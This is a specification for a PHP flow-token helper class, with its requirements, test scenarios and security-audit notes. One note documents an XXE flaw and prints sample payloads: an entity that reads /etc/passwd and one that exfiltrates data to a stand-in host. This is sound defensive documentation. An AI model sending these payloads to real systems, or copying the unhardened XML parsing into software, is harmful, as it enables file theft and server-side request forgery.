# flow-token-helper Specification

## Purpose
TBD - created by archiving change retrofit-2026-05-24-flow-token-helper. Update Purpose after archive.

@e2e exclude backend flow-token request/response snapshot helper (no browser UI) — covered by PHPUnit

## Requirements
### Requirement: Request snapshot ingestion with content parsing (REQ-001)

`__construct(...)` MUST seed all four pairs by calling each
`set<Slot>Original` followed by `set<Slot>Amended` with the value
returned from `get<Slot>Original`. For the request slot specifically,
the constructor passes `proxyHeaders: true` into the header extraction
(see Notes).

`setRequestOriginal(IRequest|array $requestOriginal, ?string $path =
null): array` MUST normalise an `IRequest` argument into the array
shape:

```php
[
  'method'     => $request->getMethod(),
  'headers'    => $this->getHeaders(server: $_SERVER, proxyHeaders: true),
  'parameters' => array_merge($request->getParams(), $this->parseContent($request)),
  'path'       => $path,
]
```

An array argument MUST be stored verbatim. The method MUST return the
stored array.

`getRequestOriginal(): array` MUST return the stored array shape
unmodified.

The private helpers MUST behave as:

- `getHeaders(array $server, bool $proxyHeaders = false): array` —
  filter `$server` for `HTTP_*` keys, optionally include
  `X-Forwarded-*` / `X-Real-IP` / `X-Original-URI` (when
  `$proxyHeaders === true`), and return a map of lowercase header
  name → value (with `HTTP_` prefix stripped).
- `getRawContent(): string` — return `file_get_contents('php://input')`
  unconditionally.
- `looksLikeXml(string $content): bool` — return `true` iff
  `simplexml_load_string($content) !== false`. Uses
  `libxml_use_internal_errors(true)` + `libxml_clear_errors()` to
  suppress warnings.
- `parseContent(IRequest $request): mixed` — dispatch by
  `Content-Type`:
  - `multipart/form-data` → `request_parse_body()` then merge `$post`
    with `array_map(fn $f => file_get_contents($f['tmp_name']),
    $files)`.
  - Otherwise: try `json_decode($content, true)` first; if non-null,
    return the decoded array.
  - If `Content-Type` is `application/xml` or `text/xml` (or empty
    AND `looksLikeXml($content) === true`), parse via
    `simplexml_load_string` and return
    `json_decode(json_encode($xml), true)`.
  - Fallback: return `$request->getParams()`.

#### Scenario: IRequest body is normalised to the array shape

- **GIVEN** an IRequest with method `POST`, headers `{ Content-Type: 'application/json' }`, raw body `{"a": 1}`
- **WHEN** `setRequestOriginal($request, '/foo')` is called
- **THEN** the stored shape carries `method: 'POST', path: '/foo', parameters: { a: 1 }`
- **AND** `headers` is a lowercase-key map derived from `$_SERVER`

#### Scenario: array argument is stored verbatim

- **GIVEN** `$arr = ['method' => 'GET', 'parameters' => ['x' => 1]]`
- **WHEN** `setRequestOriginal($arr)` is called
- **THEN** `getRequestOriginal()` returns `$arr` byte-for-byte

#### Scenario: JSON body shadows query-string params

- **GIVEN** a request with `?x=fromQuery` AND body `{ "x": "fromBody" }`
- **WHEN** the request is normalised
- **THEN** the stored `parameters.x` is `'fromBody'` (`array_merge` favours the later argument)

#### Scenario: XML body is converted via simplexml then json round-trip

- **GIVEN** a request with `Content-Type: application/xml` and body `<root><a>1</a></root>`
- **WHEN** `parseContent($request)` is called
- **THEN** the return is `[ 'a' => '1' ]` (SimpleXML stringifies leaf values)

#### Notes

- **HIGH (CWE-611 / OWASP A05:2021 XXE):** `parseContent` and
  `looksLikeXml` both call `simplexml_load_string` with default
  libxml options. PHP's default permits DTD entity resolution
  including external entities. An attacker who can shape the request
  body and the `Content-Type` header — i.e. ANY caller hitting an
  endpoint whose rule pipeline reads the FlowToken request — can
  trigger:
  - File read: `<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>`
  - SSRF / OOB exfiltration: `<!ENTITY xxe SYSTEM "http://evil.invalid/?leak=...">`
  - Billion-laughs DoS via nested entity expansion.
  The retrofit deliberately documents this as the observed behaviour.
  Hardening requires `simplexml_load_string($content, options:
  LIBXML_NONET)` (PHP 8.0+) — and possibly an explicit
  `libxml_set_external_entity_loader(null)` to ensure no external
  resolution. Fix lands as a focused security change with regression
  test (negative-XML payload).
- **MEDIUM (proxy-header trust drift):** the constructor passes
  `proxyHeaders: true`, so downstream rules see client-controllable
  `X-Forwarded-For` / `X-Real-IP` / `X-Original-URI`. Trusting
  these for ACL or routing decisions is unsafe unless Nextcloud's
  trusted_proxies config is enforced.
- **MEDIUM (soft DoS):** the multipart branch reads every uploaded
  file into memory with no size guard.
- **LOW:** `json_decode('false', true) !== null` so a literal `false`
  body falls through to the XML branch.

---

### Requirement: Response snapshot ingestion with object normalisation (REQ-002)

`setResponseOriginal(array|Response $responseOriginal): array` MUST
normalise a Nextcloud `Response` instance into the array shape:

```php
[
  'data'    => method_exists($response, 'getData') ? $response->getData() : [],
  'headers' => $response->getHeaders(),
  'status'  => $response->getStatus(),
  'cookies' => $response->getCookies(),
]
```

An array argument MUST be stored verbatim. The method MUST return the
stored array.

`getResponseOriginal(): array` MUST return the stored array.

#### Scenario: JSONResponse-style object is normalised

- **GIVEN** a `Response` subclass whose `getData()` returns `['ok' => true]`, status `200`, headers `['Content-Type' => 'application/json']`
- **WHEN** `setResponseOriginal($response)` is called
- **THEN** the stored shape is `{ data: { ok: true }, headers: { Content-Type: application/json }, status: 200, cookies: [] }`

#### Scenario: a Response without getData yields an empty data array

- **GIVEN** a `Response` whose class does NOT define `getData`
- **WHEN** `setResponseOriginal($response)` is called
- **THEN** the stored `data` is `[]`

#### Notes

- The `method_exists` probe means subclasses define the data contract;
  the base `Response` does not carry `getData`.

---

### Requirement: Sync input and sync output snapshot pairs (REQ-003)

The setters `setSyncInputOriginal(array $syncInputOriginal): array` MUST behave like
`setSyncOutputOriginal(array $syncOutputOriginal): array` and store
the argument verbatim and return it. `getSyncInputOriginal(): array`
and `getSyncOutputOriginal(): array` MUST return the stored array.

No normalisation, no validation, no type coercion.

#### Scenario: setSyncInputOriginal stores verbatim

- **WHEN** `setSyncInputOriginal(['records' => [1, 2, 3]])` is called
- **THEN** `getSyncInputOriginal()` returns `['records' => [1, 2, 3]]`

#### Scenario: setSyncOutputOriginal allows empty array

- **WHEN** `setSyncOutputOriginal([])` is called
- **THEN** `getSyncOutputOriginal()` returns `[]`

---

### Requirement: Amended-snapshot pass-through accessors (REQ-004)

For each of the four slots there MUST be a paired
`set<Slot>Amended(array): array` / `get<Slot>Amended(): array`
accessor. The setter MUST store the argument verbatim and return it.
The getter MUST return the stored array. No type coercion, no
defaulting, no observer pattern.

Initial values are seeded from the matching `Original` slot by the
constructor — but only at construction time. Subsequent
`set<Slot>Original` calls do NOT re-seed the amended slot. The
amended slot is "the most recent rewrite by the rule pipeline" with
the constructor seed as the starting state.

#### Scenario: amended seeds from original at construction

- **GIVEN** `new FlowToken(requestOriginal: $reqArr)`
- **WHEN** no setter has been called
- **THEN** `getRequestAmended() === $reqArr`

#### Scenario: re-setting original does NOT re-seed amended

- **GIVEN** a FlowToken whose original was `['a' => 1]` and whose amended was rewritten to `['b' => 2]`
- **WHEN** `setRequestOriginal(['c' => 3])` is called
- **THEN** `getRequestOriginal()` returns `['c' => 3]`
- **AND** `getRequestAmended()` still returns `['b' => 2]`

#### Notes

- This is a coupling surprise — callers that "reset" the token via
  `set<Slot>Original` MUST also call `set<Slot>Amended` to keep the
  pair in sync. Documented as observed; tightening to auto-seed on
  set-original is a behavioural change worth a separate REQ +
  migration.

---

### Requirement: Serialisation for transport/logging (REQ-005)

`__serialize(): array` MUST return a fixed-shape array containing all
8 slot values keyed by the slot name:

```php
[
  'requestOriginal'    => <array>,
  'requestAmended'     => <array>,
  'responseOriginal'   => <array>,
  'responseAmended'    => <array>,
  'syncInputOriginal'  => <array>,
  'syncInputAmended'   => <array>,
  'syncOutputOriginal' => <array>,
  'syncOutputAmended'  => <array>,
]
```

The shape is the contract for both PHP's native `serialize()` flow
(used when the token is queued or cached) and for `json_encode`
(used when the token is logged).

#### Scenario: serialise round-trips an 8-key array

- **GIVEN** a FlowToken with all 4 slots populated
- **WHEN** `__serialize()` is called
- **THEN** the result is an associative array with exactly 8 keys in the order documented above

#### Notes

- There is no matching `__unserialize` — PHP's native unserialize
  uses property defaults if `__unserialize` is absent. If the
  serialised form is used for cross-request caching, the consumer
  must re-construct the FlowToken via the public setters.

